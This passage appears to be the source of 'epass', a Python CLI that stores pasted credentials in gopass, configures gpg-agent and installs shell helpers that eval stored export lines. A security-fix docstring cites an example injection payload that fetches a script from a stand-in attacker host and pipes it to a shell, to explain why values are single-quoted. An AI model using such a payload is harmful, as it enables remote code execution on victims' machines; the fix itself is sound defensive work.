def install_shell_wrapper():
    """Writes full epass shell suite to ~/.epassrc and optionally links it in shell config."""
    epassrc_path = os.path.expanduser("~/.epassrc")

    function_block = (
        "# === epass shell suite ===\n"
        "ehelp() {\n"
        '    echo "epass shell helper commands:"\n'
        '    echo "  eload <path>   - Inject credentials into shell env"\n'
        '    echo "  ezap <path>    - Unset injected environment variables"\n'
        '    echo "  elist          - List all available secret paths"\n'
        '    echo "  eshow <path>   - View raw credential exports"\n'
        '    echo "  elock          - Purge GPG passphrase cache immediately"\n'
        '    echo "  ehelp          - Display this help menu"\n'
        "}\n\n"
        "eload() {\n"
        '    if [ -z "$1" ]; then echo "Usage: eload <path> (e.g., eload aws/dev)"; return 1; fi\n'
        '    local __epass_env\n'
        '    __epass_env=$(gopass show "$1" 2>/dev/null)\n'
        '    if [ $? -ne 0 ] || [ -z "$__epass_env" ]; then\n'
        '        echo "✗ Failed to load credentials from $1"\n'
        '        return 1\n'
        '    fi\n'
        '    eval "$__epass_env" && echo "✓ Loaded credentials from $1"\n'
        "}\n\n"
        "ezap() {\n"
        '    if [ -z "$1" ]; then echo "Usage: ezap <path> (e.g., ezap aws/dev)"; return 1; fi\n'
        '    local keys\n'
        '    keys=$(gopass show "$1" 2>/dev/null | grep -E \'^export \' | sed -E \'s/export ([A-Za-z0-9_]+)=.*/\\1/\')\n'
        '    if [ -n "$keys" ]; then\n'
        '        for k in $keys; do unset "$k"; done\n'
        '        echo "✓ Unset credentials from $1"\n'
        '    else\n'
        '        echo "No export keys found at: $1"\n'
        '    fi\n'
        "}\n\n"
        "elist() {\n"
        '    echo "Available epass credential paths:"\n'
        '    gopass list --flat 2>/dev/null | grep -v "healthcheck/"\n'
        "}\n\n"
        "eshow() {\n"
        '    if [ -z "$1" ]; then echo "Usage: eshow <path> (e.g., eshow aws/dev)"; return 1; fi\n'
        '    gopass show "$1"\n'
        "}\n\n"
        "elock() {\n"
        '    gpgconf --reload gpg-agent\n'
        '    echo "✓ Purged GPG cache (epass locked)."\n'
        "}\n"
    )

    try:
        with open(epassrc_path, "w") as f:
            f.write(function_block)
        print(f"{Color.SUCCESS}✓ Installed epass shell helper functions to ~/.epassrc{Color.RESET}")
    except Exception as e:
        print(f"{Color.ERROR}Failed to write ~/.epassrc: {e}{Color.RESET}")
        sys.exit(1)

    shell_bin = os.environ.get("SHELL", "")
    rc_file = "~/.zshrc" if "zsh" in shell_bin else "~/.bashrc"
    rc_path = os.path.expanduser(rc_file)
    source_line = "\n# === Added by epass ===\n[ -f ~/.epassrc ] && source ~/.epassrc\n"

    linked_in_rc = False
    try:
        existing_content = ""
        if os.path.exists(rc_path):
            with open(rc_path, "r") as f:
                existing_content = f.read()

        if "# === Added by epass ===" in existing_content or "source ~/.epassrc" in existing_content:
            print(f"{Color.DIM}~/.epassrc loader is already present in {rc_file}.{Color.RESET}")
            linked_in_rc = True
        else:
            with open(rc_path, "a") as f:
                f.write(source_line)
            print(f"{Color.SUCCESS}✓ Added 'source ~/.epassrc' loader to {rc_file}.{Color.RESET}")
            linked_in_rc = True
    except (PermissionError, OSError):
        print(f"{Color.WARNING}Notice: Could not append to {rc_file} due to permission limits.{Color.RESET}")

    print(f"\n{Color.PROMPT}Activation instructions:{Color.RESET}")
    if linked_in_rc:
        print(f"  Run 'source {rc_file}' or 'source ~/.epassrc' to activate immediately.")
    else:
        print(f"  Run 'source ~/.epassrc' directly or include 'source ~/.epassrc' in your shell environment.")

    print(f"\nAvailable commands:")
    print(f"  {Color.HEADER}eload <path>{Color.RESET}   - Inject credentials into shell env")
    print(f"  {Color.HEADER}ezap <path>{Color.RESET}    - Unset injected environment variables")
    print(f"  {Color.HEADER}elist{Color.RESET}          - List all available secret paths")
    print(f"  {Color.HEADER}eshow <path>{Color.RESET}   - View raw credential exports")
    print(f"  {Color.HEADER}elock{Color.RESET}          - Purge GPG passphrase cache immediately")
    print(f"  {Color.HEADER}ehelp{Color.RESET}          - Display help menu\n")
    sys.exit(0)


def reset_epass():
    """Wipes gopass stores and deletes the gopass@local GPG keypair."""
    print(f"\n{Color.WARNING}Resetting epass configuration and gopass stores...{Color.RESET}")

    paths_to_wipe = [
        "~/.config/gopass",
        "~/.local/share/gopass",
        "~/.password-store"
    ]

    for path in paths_to_wipe:
        expanded = os.path.expanduser(path)
        if os.path.exists(expanded):
            shutil.rmtree(expanded, ignore_errors=True)
            print(f" {Color.DIM}✓ Removed {expanded}{Color.RESET}")

    try:
        res = subprocess.run(['gpg', '--list-secret-keys', '--with-colons', 'gopass@local'], capture_output=True, text=True)
        fprs = [line.split(':')[9] for line in res.stdout.splitlines() if line.startswith('fpr:') and len(line.split(':')) > 9]

        for fpr in fprs:
            subprocess.run(['gpg', '--batch', '--yes', '--delete-secret-and-public-keys', fpr], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        subprocess.run(['gpg', '--yes', '--delete-secret-and-public-keys', 'gopass@local'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f" {Color.DIM}✓ Removed GPG keypair 'gopass@local'{Color.RESET}")
    except Exception:
        pass

    print(f"\n{Color.SUCCESS}✓ Reset complete. Run 'epass' again to re-initialize setup.{Color.RESET}\n")
    sys.exit(0)


def configure_gpg_agent(ttl_hours=1, max_ttl_hours=24):
    """Configures gpg-agent to cache passphrases across runs using custom TTLs."""
    gnupg_dir = os.path.expanduser("~/.gnupg")
    os.makedirs(gnupg_dir, mode=0o700, exist_ok=True)

    agent_conf = os.path.join(gnupg_dir, "gpg-agent.conf")
    gpg_conf = os.path.join(gnupg_dir, "gpg.conf")

    ttl_seconds = int(ttl_hours * 3600)
    max_ttl_seconds = int(max_ttl_hours * 3600)

    cache_settings = [
        f"default-cache-ttl {ttl_seconds}\n",
        f"max-cache-ttl {max_ttl_seconds}\n",
        "allow-loopback-pinentry\n"
    ]

    # BUGFIX: previously only default-cache-ttl / max-cache-ttl lines were filtered
    # out before rewriting, so "allow-loopback-pinentry" accumulated a duplicate
    # line on every single run of epass. Now all three managed settings are
    # stripped before being rewritten so the file stays idempotent.
    existing_lines = []
    if os.path.exists(agent_conf):
        with open(agent_conf, "r") as f:
            existing_lines = [
                line for line in f.readlines()
                if not line.strip().startswith(("default-cache-ttl", "max-cache-ttl", "allow-loopback-pinentry"))
            ]

    with open(agent_conf, "w") as f:
        f.writelines(existing_lines)
        for setting in cache_settings:
            f.write(setting)

    if os.path.exists(gpg_conf):
        with open(gpg_conf, "r") as f:
            gpg_existing = f.read()
    else:
        gpg_existing = ""

    if "pinentry-mode loopback" not in gpg_existing:
        with open(gpg_conf, "a") as f:
            f.write("pinentry-mode loopback\n")

    try:
        subprocess.run(['gpgconf', '--reload', 'gpg-agent'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Color.DIM}✓ Configured gpg-agent cache duration to {ttl_hours}h (max {max_ttl_hours}h). Customize via --ttl and --max-ttl.{Color.RESET}")
    except Exception:
        pass


def ensure_gpg_identity():
    """Ensures gopass@local key exists with encryption subkeys, prompting user for passphrase if absent."""
    res = subprocess.run(['gpg', '--list-secret-keys', 'gopass@local'], capture_output=True, text=True)
    if res.returncode == 0:
        return

    print(f"\n{Color.HEADER}No GPG identity found for 'gopass@local'. Initializing new key...{Color.RESET}")

    while True:
        pass1 = getpass.getpass(f"{Color.PROMPT}Set passphrase for gopass@local GPG key: {Color.RESET}")
        if not pass1:
            print(f"{Color.ERROR}Passphrase cannot be empty.{Color.RESET}")
            continue
        pass2 = getpass.getpass(f"{Color.PROMPT}Confirm passphrase: {Color.RESET}")
        if pass1 != pass2:
            print(f"{Color.ERROR}Passphrases do not match. Please try again.{Color.RESET}")
            continue
        break

    print(f"{Color.DIM}Generating GPG keypair and encryption subkey for gopass@local...{Color.RESET}")

    # BUGFIX: the previous implementation passed the passphrase as a literal
    # CLI argument ('--passphrase', pass1). That briefly exposes the master
    # passphrase to any other process on the host via /proc/<pid>/cmdline or
    # `ps -ef`, which directly contradicts this tool's own threat model. It is
    # now sent over stdin via --passphrase-fd 0, which never touches argv.
    cmd = [
        'gpg', '--batch', '--pinentry-mode', 'loopback', '--passphrase-fd', '0',
        '--quick-generate-key', 'gopass-user <gopass@local>', 'default', 'default', '0'
    ]

    try:
        subprocess.run(cmd, input=pass1, text=True, check=True, capture_output=True)
        print(f"{Color.SUCCESS}✓ GPG identity and encryption subkey generated successfully.{Color.RESET}")
    except subprocess.CalledProcessError as e:
        err = e.stderr if isinstance(e.stderr, str) else (e.stderr.decode() if e.stderr else str(e))
        print(f"{Color.ERROR}Failed to generate GPG key: {err}{Color.RESET}")
        sys.exit(1)
    finally:
        pass1 = None
        pass2 = None


def setup_gopass(ttl_hours=1, max_ttl_hours=24):
    """Verifies gopass capability and initializes store with GPG backend if needed."""
    print(f"{Color.HEADER}Verifying gopass capability and GPG store status...{Color.RESET}")

    config_file = os.path.expanduser("~/.config/gopass/config")
    default_store_path = os.path.expanduser("~/.local/share/gopass/stores/root")

    try:
        subprocess.run(['gopass', 'version'], capture_output=True, check=True)
    except (FileNotFoundError, subprocess.CalledProcessError):
        print(f"{Color.ERROR}Critical: 'gopass' binary is not installed or accessible in PATH.{Color.RESET}")
        sys.exit(1)

    is_fully_functional = False
    if os.path.exists(config_file) and os.path.exists(default_store_path):
        try:
            test_path = "healthcheck/probe"
            subprocess.run(
                ['gopass', 'insert', '--multiline', '--force', test_path],
                input="probe_status_ok\n", text=True, capture_output=True, check=True
            )
            subprocess.run(['gopass', 'rm', '--force', test_path], capture_output=True, check=True)
            is_fully_functional = True
        except subprocess.CalledProcessError:
            is_fully_functional = False

    if is_fully_functional:
        configure_gpg_agent(ttl_hours=ttl_hours, max_ttl_hours=max_ttl_hours)
        print(f"{Color.SUCCESS}Gopass store verified, active, and fully writeable.{Color.RESET}\n")
    else:
        print(f"\n{Color.WARNING}Gopass store is uninitialized or inaccessible.{Color.RESET}")
        confirm = input(f"{Color.PROMPT}Initialize a new gopass store with GPG encryption? [y/N]: {Color.RESET}").strip().lower()
        if confirm != 'y':
            print(f"{Color.ERROR}Aborting setup.{Color.RESET}")
            sys.exit(1)

        configure_gpg_agent(ttl_hours=ttl_hours, max_ttl_hours=max_ttl_hours)
        ensure_gpg_identity()

        print(f"{Color.DIM}Initializing gopass vault with gopass@local identity...{Color.RESET}")
        try:
            subprocess.run(['gopass', 'init', 'gopass@local'], check=True)
            print(f"\n{Color.SUCCESS}Gopass vault setup successfully initialized.{Color.RESET}\n")
        except subprocess.CalledProcessError:
            print(f"\n{Color.ERROR}Initialization workflow failed.{Color.RESET}")
            sys.exit(1)


def capture_masked_paste():
    print(f"{Color.HEADER}Please paste your variables to store in key=value format{Color.RESET}")
    print(f"{Color.DIM}--> Press Enter + Ctrl+D when finished. Press Ctrl+C or ESC to cancel. <--{Color.RESET}")
    print(f"{Color.PROMPT}Paste now: {Color.RESET}", end="", flush=True)

    pasted_input = []
    fd = sys.stdin.fileno()

    # BUGFIX: tcgetattr() raises termios.error (not caught anywhere before)
    # when stdin isn't a real TTY, e.g. piped input or non-interactive CI
    # runs. That crashed with a raw traceback. Now it fails cleanly.
    try:
        old_settings = termios.tcgetattr(fd)
    except termios.error:
        print(f"\n{Color.ERROR}stdin is not an interactive TTY; epass requires an interactive terminal to safely capture a masked paste.{Color.RESET}")
        sys.exit(1)

    cancelled = False
    try:
        tty.setraw(fd)
        while True:
            char = sys.stdin.read(1)
            if char == '\x04':
                break
            if char in ('\x1b', '\x03'):
                cancelled = True
                break
            pasted_input.append(char)
            sys.stdout.write('\r\n' if char in ('\n', '\r') else '*')
            sys.stdout.flush()
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

    if cancelled:
        print(f"\n{Color.WARNING}Paste window cancelled by user.{Color.RESET}")
        sys.exit(0)

    return "".join(pasted_input)


def detect_provider(var_name):
    v = var_name.upper()
    if v.startswith("AWS_"):
        return "aws"
    elif v.startswith("GITHUB_") or v.startswith("GH_"):
        return "github"
    elif v.startswith("AZURE_") or v.startswith("ARM_"):
        return "azure"
    elif v.startswith("GOOGLE_") or v.startswith("GCP_") or v.startswith("GCLOUD_"):
        return "google"
    elif v.startswith("DIGITALOCEAN_") or v.startswith("DO_"):
        return "digitalocean"
    return "other"


def strip_ansi(text):
    # BUGFIX: the original character class was malformed —
    # r'\[@-Z\\-_]' (with a leading \[ ) matches the *literal* sequence
    # "[@-Z\-_]" character by character instead of defining a character
    # class, so it could never match a real two-byte escape sequence.
    # The bracket now correctly opens a character class.
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)


def get_toplevel_credential_types():
    try:
        result = subprocess.run(['gopass', 'ls'], capture_output=True, text=True)
        lines = result.stdout.splitlines()
        toplevels = []
        for line in lines:
            clean_line = strip_ansi(line).strip()
            match = re.match(r'^[├└]──\s+([a-zA-Z0-9_\-]+)', clean_line)
            if match:
                toplevels.append(match.group(1))
            elif re.match(r'^[a-zA-Z0-9_\-]+$', clean_line):
                toplevels.append(clean_line)
        return sorted(list(set(toplevels)))
    except Exception:
        return []


def get_all_gopass_entries():
    try:
        result = subprocess.run(['gopass', 'list', '--flat'], capture_output=True, text=True)
        if result.returncode != 0:
            return []

        entries = []
        for line in result.stdout.splitlines():
            pass_path = line.strip()
            if pass_path and not pass_path.startswith("healthcheck/"):
                entries.append(pass_path)
        return sorted(entries)
    except Exception:
        return []


def gopass_entry_exists(pass_path):
    try:
        res = subprocess.run(['gopass', 'show', pass_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return res.returncode == 0
    except Exception:
        return False


def parse_paste_blob(text_blob):
    variables = []
    skipped = []
    lines = text_blob.splitlines()
    for line in lines:
        line_str = line.strip()
        if line_str.startswith("export "):
            line_str = line_str[7:].strip()
        if not line_str or "=" not in line_str:
            continue

        key, val = line_str.split("=", 1)
        key = key.strip()
        val = val.strip()

        if len(val) >= 2 and ((val.startswith('"') and val.endswith('"')) or (val.startswith("'") and val.endswith("'"))):
            val = val[1:-1].strip()

        if key:
            if VALID_KEY.match(key):
                variables.append((key, val))
            else:
                skipped.append(key)
    return variables, skipped


def shell_single_quote(value):
    """
    Safely single-quote a value for insertion into a POSIX shell 'export' line.

    BUGFIX (security): the previous version wrapped values in DOUBLE quotes
    (export KEY="value") with no escaping at all. Double-quoted strings in
    POSIX shells still perform $(...) command substitution, backtick
    substitution, and $VAR expansion. Since the companion `eload` shell
    function does `eval "$(gopass show ...)"`, a pasted credential value
    containing something like `$(curl attacker.sh|sh)` would have been
    executed the moment someone ran `eload`. Single-quoting (with the
    standard '"'"' escape for embedded single quotes) disables ALL shell
    expansion, closing that injection path.
    """
    return "'" + value.replace("'", "'\"'\"'") + "'"


def display_usage_instructions(entry_path):
    print(f"\n{Color.HEADER}To inject all these credentials into your shell, run:{Color.RESET}")
    print(f"----------------------------------------------------------------------")
    print(f"eload {entry_path}")
    print(f"----------------------------------------------------------------------")
    print(f"{Color.DIM}* Run 'epass --init' once if shell commands are not installed.{Color.RESET}\n")


def print_custom_help_and_exit(parser):
    parser.print_help()
    print(f"\n{Color.HEADER}Current Gopass Multi-Line Environment Entries:{Color.RESET}")
    print(f"----------------------------------------------------------------------")

    entries = get_all_gopass_entries()
    if entries:
        for entry in entries:
            print(f"{Color.SUCCESS}# Load {entry}:{Color.RESET}")
            print(f"eload {entry}\n")
    else:
        print(f"  {Color.DIM}(No entries found inside your gopass store){Color.RESET}")
    print(f"----------------------------------------------------------------------")
    sys.exit(0)


def store_in_gopass(text_blob):
    variables, skipped = parse_paste_blob(text_blob)

    if skipped:
        print(f"\n{Color.WARNING}Security Warning: Ignored inputs due to invalid formatting:{Color.RESET}")
        for invalid_item in skipped:
            print(f"  {Color.ERROR}!{Color.RESET} {invalid_item[:50]}")

    if not variables:
        print(f"\n{Color.ERROR}No safe variable pairs discovered.{Color.RESET}")
        return

    lowercase_keys = [k for k, _ in variables if k != k.upper()]
    if lowercase_keys:
        print(f"\n{Color.WARNING}Notice: Lowercase key identifiers detected (e.g. AWS profile format):{Color.RESET}")
        for k in lowercase_keys:
            print(f"  - {Color.PROMPT}{k}{Color.RESET} -> {Color.SUCCESS}{k.upper()}{Color.RESET}")

        choice = input(f"\n{Color.PROMPT}Convert keys to UPPERCASE for environment exports? [Y/n]: {Color.RESET}").strip().lower()
        if choice not in ['n', 'no']:
            variables = [(k.upper(), v) for k, v in variables]
            print(f"{Color.SUCCESS}Converted key identifiers to uppercase.{Color.RESET}")

    print(f"\n{Color.SUCCESS}Parsed {len(variables)} variables successfully.{Color.RESET}")
    for k, v in variables:
        # BUGFIX (security): the previous recap printed the first 4 real
        # characters of every secret value in cleartext ("AKIA..."). That
        # leaks credential material into the terminal scrollback / any
        # screen recording or session logger — exactly what this tool
        # exists to prevent. The recap now never echoes any part of a
        # secret's actual content.
        print(f"  - {Color.PROMPT}{k}{Color.RESET} = {Color.DIM}{'•' * 8}{Color.RESET}")

    detected_providers = [detect_provider(k) for k, _ in variables]
    provider_type = detected_providers[0] if "other" not in detected_providers else None

    if not provider_type or provider_type == "other":
        while True:
            toplevels = get_toplevel_credential_types()
            if toplevels:
                print(f"\n{Color.HEADER}Top-level credential folders:{Color.RESET}")
                for idx, folder in enumerate(toplevels, 1):
                    print(f"  [{idx}] {folder}")

            selection = input(f"{Color.PROMPT}Select index or type folder name (e.g. aws, github, devops): {Color.RESET}").strip()
            if not selection:
                provider_type = "other"
                break
            try:
                idx_val = int(selection)
                if toplevels and 1 <= idx_val <= len(toplevels):
                    provider_type = toplevels[idx_val - 1]
                    break
            except ValueError:
                if re.match(r'^[a-z0-9_-]+$', selection.lower()) and not selection[0].isdigit():
                    provider_type = selection.lower()
                    break
                print(f"{Color.ERROR}Invalid directory name standard.{Color.RESET}\n")

    while True:
        env_name = input(f"{Color.PROMPT}Enter environment namespace (e.g., dev, prod, test): {Color.RESET}").strip().lower()
        if env_name and re.match(r'^[a-z0-9_-]+$', env_name):
            break
        print(f"{Color.ERROR}Invalid environment name.{Color.RESET}")

    entry_path = f"{provider_type}/{env_name}"

    if gopass_entry_exists(entry_path):
        print(f"\n{Color.WARNING}Collision Warning! Entry already exists: {entry_path}{Color.RESET}")
        choice = input(f"{Color.PROMPT}Overwrite existing blob? [1=Overwrite, 2=Re-choose destination, 3=Cancel]: {Color.RESET}").strip()
        if choice == '2':
            return store_in_gopass(text_blob)
        if choice != '1':
            return

    # BUGFIX: previously built as f'export {k.upper()}="{v}"' — this
    # (a) forced every key to uppercase even when the user explicitly
    #     declined the uppercase-conversion prompt above, and
    # (b) used unescaped double quotes (see shell_single_quote docstring).
    # `k` here already reflects the user's chosen casing, and values are now
    # safely single-quoted.
    multiline_blob = "\n".join([f'export {k}={shell_single_quote(v)}' for k, v in variables]) + "\n"

    print(f"\n{Color.HEADER}Storing multi-line credential blob into gopass ({entry_path})...{Color.RESET}")

    try:
        subprocess.run(
            ['gopass', 'insert', '--multiline', '--force', entry_path],
            input=multiline_blob, text=True, check=True,
            stdout=subprocess.DEVNULL, stderr=subprocess.PIPE
        )
        print(f" {Color.SUCCESS}✓{Color.RESET} Stored blob successfully at: {Color.DIM}{entry_path}{Color.RESET}")
    except subprocess.CalledProcessError as e:
        err_msg = e.stderr.strip() if e.stderr else str(e)
        print(f" {Color.ERROR}✗{Color.RESET} Failed to store blob at {entry_path}: {err_msg}")
        return

    display_usage_instructions(entry_path)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="epass: Multi-line gopass storage for single-prompt eval loading.", add_help=False)
    parser.add_argument("-h", "--help", action="store_true")
    parser.add_argument("--init", action="store_true", help="Install epass shell helpers into ~/.epassrc and include in ~/.bashrc or ~/.zshrc.")
    parser.add_argument("--reset", action="store_true", help="Wipe gopass stores and remove gopass@local GPG key identity.")
    parser.add_argument("--ttl", type=float, default=1.0, help="Inactivity cache timeout in hours (default: 1)")
    parser.add_argument("--max-ttl", type=float, default=24.0, help="Maximum cache timeout in hours (default: 24)")
    args = parser.parse_args()

    if args.help:
        print_custom_help_and_exit(parser)

    if args.init:
        install_shell_wrapper()

    if args.reset:
        reset_epass()

    try:
        setup_gopass(ttl_hours=args.ttl, max_ttl_hours=args.max_ttl)
        raw_paste = capture_masked_paste()
        store_in_gopass(raw_paste)
    except KeyboardInterrupt:
        print(f"\n\n{Color.WARNING}Operation aborted by user.{Color.RESET}")
        sys.exit(0)
